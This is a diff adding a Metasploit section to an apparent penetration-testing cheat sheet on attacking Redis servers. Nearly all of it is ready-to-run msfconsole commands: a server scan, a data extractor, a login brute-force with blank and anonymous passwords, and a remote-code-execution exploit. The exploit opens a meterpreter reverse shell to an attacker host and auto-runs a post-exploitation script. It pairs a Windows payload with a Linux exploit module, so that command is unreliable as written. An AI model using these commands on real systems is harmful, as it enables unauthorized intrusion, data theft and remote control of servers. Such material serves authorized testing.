@@ -856,6 +856,65 @@ Unauthorized Access
 redis-cli -h $TARGET -p 6379
 ```
 
+#### Metasploit-Framework
+
+{% hint style="info" %}
+Scan with Metasploit
+{% endhint %}
+
+```bash
+msfconsole -qx "use auxiliary/scanner/redis/redis_server;
+    set RHOSTS $TARGET;
+    run;
+    exit"
+```
+
+{% hint style="info" %}
+Misconfiguration Check
+{% endhint %}
+
+```bash
+msfconsole -qx "use auxiliary/gather/redis_extractor;
+    set RHOSTS $TARGET;
+    run;
+    exit"
+```
+
+{% hint style="info" %}
+Brute Force
+{% endhint %}
+
+```bash
+msfconsole -qx "
+    use auxiliary/scanner/redis/redis_login;
+    set RHOSTS $TARGET;
+    set ANONYMOUS_LOGIN true;
+    set BLANK_PASSWORDS true;
+    set STOP_ON_SUCCESS true;
+    set THREADS 10;
+    run -j"
+```
+
+{% hint style="info" %}
+Remote Code Execution
+{% endhint %}
+
+```bash
+msfconsole -qx "
+    use exploit/linux/redis/redis_replication_cmd_exec;
+    set PAYLOAD windows/x64/meterpreter/reverse_https;
+    set RHOSTS $TARGET;
+    set LHOST $NGHOST;
+    set LPORT 443;
+    set ReverseListenerBindAddress 127.0.0.1;
+    set ReverseListenerBindPort 4444;
+    set HandlerSSLCert $CERT;
+    set StagerVerifySSLCert true;
+    set StageEncoder true;
+    set AutoRunScript /tmp/post-exp.rc;
+    run -j"
+```
+
 #### [Hydra](https://github.com/vanhauser-thc/thc-hydra)
 
 {% hint style="info" %}
